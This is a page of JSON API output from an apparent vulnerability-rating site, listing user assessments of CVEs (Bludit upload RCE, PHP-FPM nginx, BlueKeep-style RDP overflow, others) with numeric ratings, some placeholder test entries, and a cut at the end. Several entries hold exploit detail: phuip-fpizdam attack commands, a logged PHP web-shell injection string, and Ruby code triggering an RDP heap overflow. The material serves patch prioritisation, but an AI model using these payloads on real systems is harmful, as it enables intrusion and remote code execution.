{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=3&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=1&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=2&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "27e118e4-bea7-496d-8dbd-e03ef2c4b6bd",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "c391fe82-5c99-4092-b586-0ff9f6593965",
      "created": "2019-10-24T04:38:19.269342Z",
      "revisionDate": "2020-06-03T14:58:35.35096Z",
      "document": "# CVE-2019-16113 Bludit Directory Traversal Vulnerability\r\n\r\n## Description\r\n\r\nBludit is a web application written in PHP to build your own website or blog, free and open source. It uses files in JSON format to store the content, so it is configuration-free.\r\n\r\nA vulnerability was found in the upload-images.php file, where a remote user could upload a fake image file that is actually a malicious PHP payload, and gain remote code execution.\r\n\r\n## Technical Analysis\r\n\r\nThe vulnerable file (upload-images.php) is written as follows:\r\n\r\n```php\r\n<?php defined('BLUDIT') or die('Bludit CMS.');\r\nheader('Content-Type: application/json');\r\n/*\r\n| Upload an image to a particular page\r\n|\r\n| @_POST['uuid']\tstring\tPage uuid\r\n|\r\n| @return\t\tarray\r\n*/\r\n// $_POST\r\n// ----------------------------------------------------------------------------\r\n$uuid = empty($_POST['uuid']) ? false : $_POST['uuid'];\r\n// ----------------------------------------------------------------------------\r\n// Set upload directory\r\nif ($uuid && IMAGE_RESTRICT) {\r\n\t$imageDirectory = PATH_UPLOADS_PAGES.$uuid.DS;\r\n\t$thumbnailDirectory = $imageDirectory.'thumbnails'.DS;\r\n\tif (!Filesystem::directoryExists($thumbnailDirectory)) {\r\n\t\tFilesystem::mkdir($thumbnailDirectory, true);\r\n\t}\r\n} else {\r\n\t$imageDirectory = PATH_UPLOADS;\r\n\t$thumbnailDirectory = PATH_UPLOADS_THUMBNAILS;\r\n}\r\n$images = array();\r\nforeach ($_FILES['images']['name'] as $uuid=>$filename) {\r\n\t// Check for errors\r\n\tif ($_FILES['images']['error'][$uuid] != 0) {\r\n\t\t$message = $L->g('Maximum load file size allowed:').' '.ini_get('upload_max_filesize');\r\n\t\tLog::set($message, LOG_TYPE_ERROR);\r\n\t\tajaxResponse(1, $message);\r\n\t}\r\n\t// Convert URL characters such as spaces or quotes to characters\r\n\t$filename = urldecode($filename);\r\n\t// Move from PHP tmp file to Bludit tmp directory\r\n\tFilesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);\r\n\t// Transform the image and generate the thumbnail\r\n\t$image = transformImage(PATH_TMP.$filename, $imageDirectory, $thumbnailDirectory);\r\n\tif ($image) {\r\n\t\t$filename = Filesystem::filename($image);\r\n\t\tarray_push($images, $filename);\r\n\t} else {\r\n\t\t$message = $L->g('File type is not supported. Allowed types:').' '.implode(', ',$GLOBALS['ALLOWED_IMG_EXTENSION']);\r\n\t\tLog::set($message, LOG_TYPE_ERROR);\r\n\t\tajaxResponse(1, $message);\r\n\t}\r\n}\r\najaxResponse(0, 'Images uploaded.', array(\r\n\t'images'=>$images\r\n));\r\n?>\r\n```\r\n\r\nThe first thing that happens is that the code retrieves the \"uuid\" parameter from a POST request:\r\n\r\n```php\r\n$uuid = empty($_POST['uuid']) ? false : $_POST['uuid'];\r\n```\r\n\r\nThe uuid is used as part of the image directory path. If the path doesn't exist, then it will be automatically created:\r\n\r\n```php\r\nif ($uuid && IMAGE_RESTRICT) {\r\n\t$imageDirectory = PATH_UPLOADS_PAGES.$uuid.DS;\r\n\t$thumbnailDirectory = $imageDirectory.'thumbnails'.DS;\r\n\tif (!Filesystem::directoryExists($thumbnailDirectory)) {\r\n\t\tFilesystem::mkdir($thumbnailDirectory, true);\r\n\t}\r\n```\r\n\r\nNext, the code starts uploading the file by accessing the `$_FILES` variables. In here, the content of the uploaded item isn't checked, which means even though the file expects an image file, it doesn't actually have to be. A malicious PHP payload could be uploaded instead:\r\n\r\n```php\r\nforeach ($_FILES['images']['name'] as $uuid=>$filename) {\r\n  // ... code ...\r\n```\r\n\r\nFinally, the file is moved from PHP's temp file to a custom tmp directory:\r\n\r\n```php\r\nFilesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);\r\n```\r\n\r\nEven though the image upload is uploaded to Bluedit's tmp directory, you can actually also upload a .htaccess file to allow the PHP payload to be accessed remotely, and gain remote code execution.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "0bc8eabb-f84f-4575-a0b0-694616ecd17b",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "1a028e9f-233b-47d8-8c85-fd179a3627ec",
      "created": "2019-10-29T20:20:50.997914Z",
      "revisionDate": "2020-02-13T17:11:59.778707Z",
      "document": "The exploit is readily available and quite easy to execute, I would advise prioritising the patching this of vulnerability asap",
      "score": 5,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "79f2db3c-a2a7-49cc-8503-ae557d08d1bc",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "1a028e9f-233b-47d8-8c85-fd179a3627ec",
      "created": "2019-10-29T20:51:21.498468Z",
      "revisionDate": "2020-02-13T17:11:59.575872Z",
      "document": "Other than calibrating the QSL detection, this one looks straightforward to implement as a Metasploit module.\r\n\r\nSome raw notes from yesterday:\r\n\r\n```\r\nwvu@kharak:~/Downloads/phuip-fpizdam:master$ ~/go/bin/phuip-fpizdam --only-qsl http://127.0.0.1:8080/script.php\r\n2019/10/28 15:53:00 Base status code is 200\r\n2019/10/28 15:53:00 Status code 502 for qsl=1765, adding as a candidate\r\n2019/10/28 15:53:00 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]\r\n2019/10/28 15:53:00 Detect() found QSLs and that's it\r\nwvu@kharak:~/Downloads/phuip-fpizdam:master$\r\n```\r\n\r\n```\r\n[28-Oct-2019 20:53:00] WARNING: [pool www] child 16 exited on signal 11 (SIGSEGV) after 5.221837 seconds from start\r\n```\r\n\r\n```\r\nwvu@kharak:~/Downloads/phuip-fpizdam:master$ ~/go/bin/phuip-fpizdam --qsl 1760 --pisos 55 --skip-detect http://127.0.0.1:8080/script.php\r\n2019/10/28 15:57:32 Using attack params --qsl 1760 --pisos 55 --skip-detect\r\n2019/10/28 15:57:32 Performing attack using php.ini settings...\r\n2019/10/28 15:57:33 Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs\r\n2019/10/28 15:57:33 Trying to cleanup /tmp/a...\r\n2019/10/28 15:57:33 Done!\r\nwvu@kharak:~/Downloads/phuip-fpizdam:master$\r\n```\r\n\r\n```\r\n172.17.0.1 - - [28/Oct/2019:20:57:33 +0000] \"GET /script.php/?a=%3Becho+%27%3C%3Fphp+echo+%60%24_GET%5Ba%5D%60%3Breturn%3B%3F%3E%27%3E%2Ftmp%2Fa%3Bwhich+whichozilla/5.0\"\r\n```\r\n\r\n```\r\n>>> print(urllib.parse.unquote('172.17.0.1 - - [28/Oct/2019:20:57:33 +0000] \"GET /script.php/?a=%3Becho+%27%3C%3Fphp+echo+%60%24_GET%5Ba%5D%60%3Breturn%3B%3F%3E%27%3E%2Ftmp%2Fa%3Bwhich+whichozilla/5.0\"'))\r\n172.17.0.1 - - [28/Oct/2019:20:57:33 +0000] \"GET /script.php/?a=;echo+'<?php+echo+`$_GET[a]`;return;?>'>/tmp/a;which+whichozilla/5.0\"\r\n>>>\r\n```",
      "score": 5,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "e6bc7f0d-cd8b-4d54-9bb1-bba72eeef495",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "1a028e9f-233b-47d8-8c85-fd179a3627ec",
      "created": "2019-10-29T21:08:57.509607Z",
      "revisionDate": "2020-02-13T17:11:59.34294Z",
      "document": "It's not clear often this particular configuration is deployed; you may find that you're not vulnerable in particular if you're not using the specific configuration (just because you're using PHP 7 or nginx, that's not sufficient to be exploited). But, you should at least check the configuration even if you don't patch, since the exploit itself is reliable, trivial, and easy to spray.\r\n\r\nIt appears there are possibly other ways to exploit earlier versions of PHP with this same bug: https://twitter.com/TheHackersNews/status/1188171528090746880?s=20",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "b805b560-95f6-46f2-a1a3-9434e284dbb7",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "0dd933a3-73aa-4c00-a2cf-953b5dc3bfa6",
      "created": "2019-10-30T20:04:07.009822Z",
      "revisionDate": "2020-02-13T17:11:59.144632Z",
      "document": "Probably not that interesting of a bug for an attacker. Basically you can DoS a BIND server. I sort of think most folks using BIND in a critical environment are likely using the ISC releases anyway. It is telling that the bug in this backport appears to have taken a year to discover.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "32ef6228-9c3f-4539-bd24-8bafad527c26",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "30452b6b-7fdb-43ae-a26c-7af426287520",
      "created": "2019-10-30T20:52:15.353276Z",
      "revisionDate": "2020-02-13T17:11:58.949685Z",
      "document": "This is fairly trivial to exploit since there is an excellent Metasploit module for it. This software, when you find it, is likely to contain important business data, which can be valuable to an attacker.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "623a13bd-1ad7-4d2d-bdbe-9a9ee0bb5835",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "45c06f42-ee61-4551-8298-0b856111798f",
      "created": "2019-10-30T20:54:23.779507Z",
      "revisionDate": "2020-02-13T17:11:58.696128Z",
      "document": "Effort to execute is high now because it's so hard to find vulnerable web browsers that can even run Java applets in 2019. But if you have a target audience, this was obviously a good vuln in 2012.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "7624252a-5131-4356-82c3-411596a721fa",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3609e46b-e023-474d-b14a-026e01af8ea9",
      "created": "2019-11-01T18:45:06.224036Z",
      "revisionDate": "2020-05-05T12:19:38.521137Z",
      "document": "Based on the technical analysis by Kaspersky, this is a very effective exploit, and is able to leverage an info leak, heap grooming, and the malware deployed via watering-hole injection on a Korean-language news portal, establishes persistence via a dropped file on disk.\r\n\r\nAn attacker does need to leverage a few items in advance for this and any client-side attack, that is a watering hole injection or some other delivery method. Chrome's quick patching mechanism means these vulns _typically_ have a short shelf life, though the inability to force users to actually update is a limiting factor.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "8f0ac611-a070-4eac-a202-8f7e3f36630a",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "3609e46b-e023-474d-b14a-026e01af8ea9",
      "created": "2019-11-01T19:32:54.486202Z",
      "revisionDate": "2020-05-05T12:19:42.375423Z",
      "document": "Judging by the Kaspersky writeup, it looks like the vulnerability exists for a relatively large number of Chrome versions. Fix was released for 78.0.3904.87, and the exploit checks the range from 65-77. Despite the seemingly difficult development and execution of this exploit, this is an important one to patch.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "9a14edba-482e-45f4-88da-90bebad837e9",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "49f14151-a763-43b0-9d5d-e4ad6b09cfdd",
      "created": "2019-11-13T16:36:24.427498Z",
      "revisionDate": "2020-02-13T17:11:58.107713Z",
      "document": "I did the thing",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 3,
        "exploitability": 1,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "b551850e-d9a8-4390-8554-218abecfb5f5",
      "editorId": "2cf32c54-5a35-405c-b839-6615b57b92d8",
      "topicId": "49f14151-a763-43b0-9d5d-e4ad6b09cfdd",
      "created": "2019-11-13T16:36:52.344585Z",
      "revisionDate": "2020-02-13T17:11:57.91494Z",
      "document": "If a vuln ran in the wild, and no one was around to see it, did it make a sound?",
      "score": 2,
      "metadata": {
        "stability": 3,
        "reliability": 4,
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "used-successfully": 2,
        "mitigation-strength": 4,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "2286a6fa-d781-4ffd-8c7c-c4d6e97157b7",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "e4f9e631-e12c-409e-a290-14fa6781c45a",
      "created": "2019-11-13T16:41:34.825757Z",
      "revisionDate": "2020-02-13T17:11:57.713662Z",
      "document": "bbb",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 2,
        "attacker-value": 1,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "f947989a-42dd-4bf5-b076-a38b5cd0b666",
      "editorId": "6d00a11d-d7a6-4e98-a7ed-834b16d67594",
      "topicId": "49f14151-a763-43b0-9d5d-e4ad6b09cfdd",
      "created": "2019-11-13T16:43:59.459709Z",
      "revisionDate": "2020-02-13T17:11:57.514926Z",
      "document": "TODO: DELETE\r\n\r\nThis vuln is teh suck",
      "score": 1,
      "metadata": {
        "stability": 1,
        "reliability": 1,
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 1,
        "used-successfully": 1,
        "mitigation-strength": 1,
        "confidence-in-ratings": 1,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "4f26e66c-f515-49a5-82ec-30c555822031",
      "editorId": "1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5",
      "topicId": "e4f9e631-e12c-409e-a290-14fa6781c45a",
      "created": "2019-11-13T16:52:44.76282Z",
      "revisionDate": "2020-02-13T17:11:57.317713Z",
      "document": "Testing 123",
      "score": 1,
      "metadata": {
        "stability": 3,
        "reliability": 2,
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 2,
        "used-successfully": 1,
        "mitigation-strength": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "a4c3bb59-0b35-40c1-9c83-153253dc413b",
      "editorId": "758f2378-44fc-4685-9f8a-9824f8f374c6",
      "topicId": "9587f826-d6ea-46ae-9c51-642ac5894dad",
      "created": "2019-11-13T17:01:44.625368Z",
      "revisionDate": "2020-02-13T17:11:57.121667Z",
      "document": "Watch _Jeopardy!_, Alex Trebek's fun TV quiz game.\r\n\r\n```golang\r\n// A cow will moo until it is being milked\r\nfunc cow(num int, mootube chan Moo) {\r\n    tube := make(chan bool)\r\n    for {\r\n        select {\r\n        case mootube <- Moo{num, \"moo\", tube}:\r\n            fmt.Println(\"Cow number\", num, \"mooed through the mootube\")\r\n            <-tube\r\n            fmt.Println(\"Cow number\", num, \"is being milked and stops mooing\")\r\n            mootube <- Moo{num, \"mooh\", nil}\r\n            fmt.Println(\"Cow number\", num, \"moos one last time in relief\")\r\n            return\r\n        default:\r\n            fmt.Println(\"Cow number\", num, \"mooed through the mootube and was ignored\")\r\n            time.Sleep(time.Duration(rand.Int31n(1000)) * time.Millisecond)\r\n        }\r\n    }\r\n}\r\n```",
      "score": 1,
      "metadata": {
        "stability": 4,
        "reliability": 2,
        "attacker-value": 2,
        "used-successfully": 4,
        "mitigation-strength": 4,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "2bb96155-0908-470d-8fcf-b477c2461851",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-11-14T17:12:43.129095Z",
      "revisionDate": "2020-03-12T20:08:29.696979Z",
      "document": "Analysis performed using rdpcorets.dll from Windows 8.1 x64 (sha256: `c9d1f3c0a9459c67e96115041d622808decc31f9a9b7e3b4806421557f09cda1`)\r\n\r\nThe vulnerability exists within `rdpcorets.dll` loaded in the process `svchost.exe -k NetworkService` running as `NT AUTHORITY\\NETWORK SERVICE`. This is started by the service \"Remote Desktop Services\".\r\n\r\nThe bug is triggered by sending a specially crafted request over the `drdynvc` channel which must be setup. Use the flags `RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP` when initializing it.\r\n\r\nAfter the DynVC channel has been initialized, the overflow is triggered by sending segmented data (`DYNVC_DATA_COMPRESSED`) frame, see MS-RDPEDYC:25 for details. Note that segmented data is different than a data segment.\r\n\r\nThe compressed frame includes a payload as defined in MS-RDPEGFX section 2.2.5. The below snippet can be used to build a compatible data segment. The RDP segmented data field contains a length field which is the root cause of the vulnerability. \r\n\r\n```ruby\r\n  # see [MS-RDPEGFX] section 2.2.5.2\r\n  def build_rdp_data_segment(data)\r\n    # RDP_DATA_SEGMENT\r\n    encoded = [data.length + 1].pack(\"L<\")\r\n    encoded << \"\\x04\"\r\n    encoded << data\r\n  end\r\n\r\n  def build_trigger\r\n      # see [MS-RDPEGFX] section 2.2.5\r\n      rdp_data_segment = build_rdp_data_segment((\"\\x41\" * 0x50) + [0xdead1337dead1337].pack('Q'))\r\n      rdp_segmented_data = [0xe1, 1, 0x40 - 0x2000].pack(\"CS<l<\") + rdp_data_segment\r\n  end\r\n```\r\n\r\nAn object needs to be created and corrupted, potential candidates are below.\r\n\r\n| Object Name                  | Breakpoint Address | Size  | Can Create?                  |\r\n| ---------------------------- | ------------------ | ----- | ---------------------------- |\r\n| CRdpDynVCMgr ChannelInternal | `rdpcorets+c8e03`  | 0x138 | Static number can be created |\r\n| DecompressRdp8               | `rdpcorets+16274a` | 0x68  |                              |\r\n| DecompressUnchopper          | `rdpcorets+12dd1a` | 0x48  |                              |\r\n\r\n## Relevant Breakpoints\r\n* `rdpcorets+f67dc  \".printf \\\"CRdpDynVCMgr::HandleIncomingDvcData\\\\n\\\"; db rdx\"`\r\n* `rdpcorets+1dcc89 \".printf \\\"memcpy(dst=%N, src=%N, size=%N)\\\\n\\\", rcx, rdx, r8; g`\r\n    * `memcpy` call that copies the buffer to the target and overflows it\r\n* `rdpcorets+c9538 \".printf \\\"CRdpDynVC::Initialize\\\\n\\\"; g\"`\r\n    * Watch object creation instances\r\n* `msvcrt+1e00 \".printf \\\"operator new(size=%N)\\\", rcx; gu; .printf \\\" = %N\\\\n\\\", rax; g\"`\r\n\r\n## Read Access Violation\r\nThe following stack trace was taken during a RAV after having corrupted an object using the target memcpy call.\r\n\r\n```\r\n0:001> g\r\n(138c.13b4): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\nrdpcorets+0xd9d36:\r\n00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx ds:41414141`41414155=????????????????\r\n0:033> k\r\nChild-SP          RetAddr           Call Site\r\n00000050`beaaf478 00007fff`a5b79c7f rdpcorets+0xd9d36\r\n00000050`beaaf480 00007fff`a5b7c3bf rdpcorets+0xd9c7f\r\n00000050`beaaf4c0 00007fff`a5b91190 rdpcorets+0xdc3bf\r\n00000050`beaaf5f0 00007fff`a5b90cb1 rdpcorets+0xf1190\r\n00000050`beaaf690 00007fff`a5bf2893 rdpcorets+0xf0cb1\r\n00000050`beaaf720 00007fff`c9ed13d2 rdpcorets!DllGetClassObject+0x75b3\r\n00000050`beaaf7e0 00007fff`caf654f4 KERNEL32!BaseThreadInitThunk+0x22\r\n00000050`beaaf810 00000000`00000000 ntdll!RtlUserThreadStart+0x34\r\n0:033> u\r\nrdpcorets+0xd9d36:\r\n00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx\r\n00007fff`a5b79d3a 498d5028        lea     rdx,[r8+28h]\r\n00007fff`a5b79d3e 41c7401038000000 mov     dword ptr [r8+10h],38h\r\n00007fff`a5b79d46 4d89481c        mov     qword ptr [r8+1Ch],r9\r\n00007fff`a5b79d4a 45894824        mov     dword ptr [r8+24h],r9d\r\n00007fff`a5b79d4e 8d0c8510000000  lea     ecx,[rax*4+10h]\r\n00007fff`a5b79d55 4803ca          add     rcx,rdx\r\n00007fff`a5b79d58 44890a          mov     dword ptr [rdx],r9d\r\n0:033> r\r\nrax=0000000000000000 rbx=00007fffa5b79d10 rcx=00000050bf0c1940\r\nrdx=0000000000000001 rsi=00000050bdcba9a0 rdi=00000050bf0c1940\r\nrip=00007fffa5b79d36 rsp=00000050beaaf478 rbp=00000050bf0c7450\r\n r8=4141414141414141  r9=0000000000000000 r10=0000000000000007\r\nr11=00000050beaaf4b8 r12=00000050bf0c1f40 r13=00000050bf0c23c0\r\nr14=0000000000000000 r15=00000050bdccfdc0\r\niopl=0         nv up ei pl zr na po nc\r\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\r\nrdpcorets+0xd9d36:\r\n00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx ds:41414141`41414155=????????????????\r\n```",
      "score": 15,
      "metadata": {
        "stability": 3,
        "reliability": 3,
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "8c3026b5-7ae9-4e5f-8237-199a88160374",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "840afa91-fc8e-4cfb-b206-1aa1b1a1efdd",
      "created": "2019-11-14T18:11:16.616954Z",
      "revisionDate": "2020-02-13T17:11:56.68976Z",
      "document": "This requires authentication via a remote shell in order to be effective. If an adversary is on your Metasploit Pro machine such that they can access the key in the first place, it's already game-over. So, having the web-server certificate key (which is by default a fake cert anyway) is unlikely to be a high risk for a Metasploit Pro user.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "b17941c2-fbfe-4a42-9150-d64e6d55ce89",
      "editorId": "71b6164f-015d-49ad-bff4-b54bfd579996",
      "topicId": "a600f9d9-db2b-4d35-9055-5ba9ab7aa3ae",
      "created": "2019-11-14T21:34:23.022574Z",
      "revisionDate": "2020-02-13T17:11:56.491557Z",
      "document": "This vuln is triggerable as a drive-by if someone visits a site using a browser while the impacted nvidia blob driver was used on the system. You could do this by installing a custom set of font glyphs that contain shellcode, and overflowing the video buffer with a long \"string\" of those glyphs (which would write past the video buffer memory boundary). However, the likelihood of someone using this driver today is extremely low, so, not very useful.",
      "score": 2,
      "metadata": {
        "stability": 3,
        "reliability": 3,
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "3e27fc54-7123-40fb-ae22-0f9def5a5bcb",
      "editorId": "71b6164f-015d-49ad-bff4-b54bfd579996",
      "topicId": "b9f2cfed-c0a1-431f-aeb0-dfa8b1ef82cf",
      "created": "2019-11-14T21:43:37.804549Z",
      "revisionDate": "2020-05-29T14:51:13.725458Z",
      "document": "Causes a hard crash for the web application server (for example, Tomcat) which directly handles web requests by simply posting 4097 characters to an affected server using the AES GCM cipher (where that server has the requisite CPU extensions enabled, which is most modern processors). Super easy to exploit; can just use curl.\r\n\r\nSee the blog post I wrote about it:\r\nhttps://blog.rapid7.com/2015/07/16/r7-2015-09-oracle-java-jre-aes-intrinsics-remote-denial-of-service-cve-2015-2659/",
      "score": 3,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "4681b1a9-b3ec-438c-b7f7-f114076d591c",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "c7974b74-e51d-401d-aa60-f64ff97ee2f7",
      "created": "2019-11-14T22:04:44.695486Z",
      "revisionDate": "2020-02-13T17:11:56.095648Z",
      "document": "Authentication bypass on medical software in general is a big utility to both an attacker and a liability for medical professionals using the software.\r\n\r\nWhere is may be less applicable in utility is simply in where it is used. The list of labs that do use this software is listed straight on the software's website which hopefully allowed them to communicate the importance of patching before this vulnerability was announced (and hopefully they applied additional compensating controls in the process): http://blis.cc.gatech.edu/index.php",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "a5e6c0e8-e243-41d0-8db6-65aa3883c223",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "f4e286d7-e929-4c3c-a484-a9a97986d5a4",
      "created": "2019-11-14T22:37:17.500238Z",
      "revisionDate": "2020-02-13T17:11:55.891867Z",
      "document": "Saw this on Patrick Wardle's twitter account and it looked like a fun bug: https://twitter.com/patrickwardle/status/1195091637048946689\r\n\r\nhttps://www.cisecurity.org/advisory/vulnerability-in-microsoft-office-for-mac-could-allow-for-remote-code-execution_2019-119/",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1
      },
      "tags": []
    },
    {
      "id": "f5ff9db8-2e46-4529-8fce-76fca251aeab",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "0d37ca24-1a96-4579-9fde-acadb531aefe",
      "created": "2019-11-19T23:25:29.3873Z",
      "revisionDate": "2020-02-13T17:11:55.474912Z",
      "document": "Since this is being exploited in the wild, and affects a wide range of Internet Explorer versions, it looks like it will have some longterm success in targeted phishing and malvertizing campaigns. IE might be down to just 2% of usage, but it's the only option out of the box on most WIndows Server versions, so it's at least easy-ish to be running a vulnerable version until you can get patches applied or download a different browser first.\r\n\r\nProbably only urgent to patch if you actually use it.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "b2814996-4838-4fbb-9a30-67141090ae0e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "aa14b243-8e3b-42fa-b2f2-b686b440e2f3",
      "created": "2019-11-20T04:00:24.44119Z",
      "revisionDate": "2020-02-13T17:11:55.262228Z",
      "document": "This configuration issue could really affect any version, since it's just someone having left the debug option on in the default config.\r\nMetasploit has had a general scanner for this misconfiguration since 2012 in auxiliary/scanner/misc/java_rmi_server and 2011 in modules/exploits/multi/misc/java_rmi_server. Just noticed https://github.com/rapid7/metasploit-framework/pull/12565 which might be useful as well.\r\n\r\nShodan only shows _maybe_ one host on the internet exposing this port in something that could plausibly look like JMX. The next great internet work this will not be: https://www.shodan.io/search?query=port%3A18983\r\n\r\nI'm giving this a high attacker utility but _also_ a low urgency to patch, because the patch is almost irrelevant here. If you're using the default solr config, your solr install probably doesn't work anyway! The patch isn't really required to fix this configuration bug,, and you could be vulnerable with or without updating to a newer version. Even if you patch, if you have the a bad config, it's not necessarily going to auto-update either. Any authenticated vuln scan is probably going to produce misleading results about whether you're actually vulnerable or not, unless it checks your config file. Doing a remote scan is much better.\r\n\r\nThe mitigation is really just making sure you don't deploy a config that leaves unauth RMI servers on a network, but nothing really stops you from shooting yourself in the foot either. Note that Solr's own docs tell you how to enable this bit, but also it says to not use it in production. https://lucene.apache.org/solr/guide/7_0/using-jmx-with-solr.html\r\n\r\n",
      "score": 4,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 1,
        "used-successfully": 5,
        "mitigation-strength": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
